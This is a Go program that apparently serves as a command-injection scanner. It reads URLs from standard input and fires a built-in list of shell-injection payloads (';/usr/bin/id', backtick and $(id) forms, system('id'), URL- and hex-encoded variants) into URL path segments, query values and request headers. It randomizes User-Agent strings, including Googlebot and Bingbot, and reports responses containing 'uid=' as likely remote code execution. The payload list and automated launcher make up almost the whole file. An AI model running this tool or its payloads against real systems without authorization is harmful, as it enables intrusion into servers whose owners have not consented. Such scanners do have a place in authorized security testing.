package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

type Payload struct {
	Payload    string
	Encoding   string
	MatchRegex string
}

var (
	payloads = []Payload{
		{";/usr/bin/id\n", "none", `uid=\d+\(.+?\)`},
		{"eval('id')", "none", `uid=`},
		{"%0Aid%0A", "url", `uid=`},
		{"$;/usr/bin/id", "none", `uid=\d+\(.+?\)`},
		{"%0a id %0a", "url", `uid=`},
		{"%22.system%28id%29.%22", "url", `uid=`},
		{"%26id%26", "url", `uid=`},
		{"`id`", "none", `uid=`},
		{"1;system('id')", "none", `uid=`},
		{"'.print((`id`)).'", "none", `uid=`},
		{"%26echo%20`id`%24()%5C%20", "url", `uid=`},
		{"%26%26%20id%20%26%26", "url", `uid=`},
		{";{\\x69\\x64}", "hex", `uid=`},
		{"${{SHELL}:-/bin/sh} -c 'id'", "env-var", `uid=`},
		{"i\\d", "regex-escape", `uid=`},
		{";true%26%26id;", "logical-op", `uid=`},
		{"/*$(id)*/", "comment", `uid=`},
	}

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"curl/7.64.1",
		"PostmanRuntime/7.28.4",
	}

	verbose     bool
	outputFile  *os.File
	fileMu      sync.Mutex
	client      *http.Client
	concurrency int
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	var output string
	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.StringVar(&output, "o", "", "Output file to save results")
	flag.IntVar(&concurrency, "t", 10, "Number of concurrent threads")
	flag.Parse()

	if output != "" {
		f, err := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error opening output file: %v\n", err)
			os.Exit(1)
		}
		outputFile = f
		defer outputFile.Close()
	}

	client = &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        concurrency,
			IdleConnTimeout:     30 * time.Second,
			DisableCompression:  true,
			DisableKeepAlives:   false,
			MaxIdleConnsPerHost: concurrency,
		},
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, concurrency)

	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		rawURL := sc.Text()
		u, err := url.Parse(rawURL)
		if err != nil {
			fmt.Printf("Error parsing URL %s: %v\n", rawURL, err)
			continue
		}

		processURL(u, &wg, sem)
	}

	wg.Wait()
	if err := sc.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "Error reading input: %v\n", err)
	}
}

func processURL(u *url.URL, wg *sync.WaitGroup, sem chan struct{}) {
	testInjectionPoints(u, wg, sem)
	testHeaderInjections(u, wg, sem)
}

func testInjectionPoints(u *url.URL, wg *sync.WaitGroup, sem chan struct{}) {
	path := strings.Trim(u.Path, "/")
	pathSegments := strings.Split(path, "/")

	for i := range pathSegments {
		for _, payload := range payloads {
			wg.Add(1)
			go func(u *url.URL, segments []string, idx int, p Payload) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				modified := make([]string, len(segments))
				copy(modified, segments)
				modified[idx] = applyEncoding(p.Payload, p.Encoding)
				newPath := "/" + strings.Join(modified, "/")
				
				newU := u.ResolveReference(&url.URL{
					Path:     newPath,
					RawQuery: u.RawQuery,
				})
				sendRequest(newU, p)
			}(u, pathSegments, i, payload)
		}
	}

	query := u.Query()
	for key := range query {
		values := query[key]
		for valIdx := range values {
			for _, payload := range payloads {
				wg.Add(1)
				go func(u *url.URL, key string, values []string, valIdx int, p Payload) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					modifiedVals := make([]string, len(values))
					copy(modifiedVals, values)
					modifiedVals[valIdx] = applyEncoding(p.Payload, p.Encoding)
					newQuery := u.Query()
					newQuery[key] = modifiedVals

					newU := u.ResolveReference(&url.URL{
						Path:     u.Path,
						RawQuery: newQuery.Encode(),
					})
					sendRequest(newU, p)
				}(u, key, values, valIdx, payload)
			}
		}
	}
}

func testHeaderInjections(u *url.URL, wg *sync.WaitGroup, sem chan struct{}) {
	headers := []string{"User-Agent", "X-Forwarded-For", "Referer", "Accept-Language"}
	for _, header := range headers {
		for _, payload := range payloads {
			wg.Add(1)
			go func(h string, p Payload) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				req, _ := http.NewRequest("GET", u.String(), nil)
				encodedPayload := applyEncoding(p.Payload, p.Encoding)
				req.Header.Set(h, encodedPayload)
				setRandomUserAgent(req)
				sendCustomRequest(req, p)
			}(header, payload)
		}
	}
}

func applyEncoding(payload, encoding string) string {
	switch encoding {
	case "url":
		return url.QueryEscape(payload)
	case "hex":
		return strings.ReplaceAll(payload, "\\x", "%")
	case "env-var":
		return strings.ReplaceAll(payload, "${SHELL}", "/bin/sh")
	default:
		return payload
	}
}

func setRandomUserAgent(req *http.Request) {
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	}
}

func sendRequest(u *url.URL, p Payload) {
	req, _ := http.NewRequest("GET", u.String(), nil)
	setRandomUserAgent(req)
	sendCustomRequest(req, p)
}

func sendCustomRequest(req *http.Request, p Payload) {
	if verbose {
		fmt.Printf("[*] Testing: %s\n", req.URL.String())
		fmt.Printf("[*] Using User-Agent: %s\n", req.Header.Get("User-Agent"))
	}

	resp, err := client.Do(req)
	if err != nil {
		if verbose {
			fmt.Printf("[-] Request failed: %v\n", err)
		}
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	if match, _ := regexp.MatchString(p.MatchRegex, bodyStr); match {
		msg := fmt.Sprintf("[+] Potential RCE Vulnerability at %s\n", req.URL.String())
		msg += fmt.Sprintf("    Payload: %s\n", p.Payload)
		msg += fmt.Sprintf("    User-Agent: %s\n", req.Header.Get("User-Agent"))
		msg += fmt.Sprintf("    Match: %s\n\n", p.MatchRegex)
		reportFinding(msg)
	}
}

func reportFinding(msg string) {
	fmt.Print(msg)
	if outputFile != nil {
		fileMu.Lock()
		defer fileMu.Unlock()
		fmt.Fprint(outputFile, msg)
	}
}
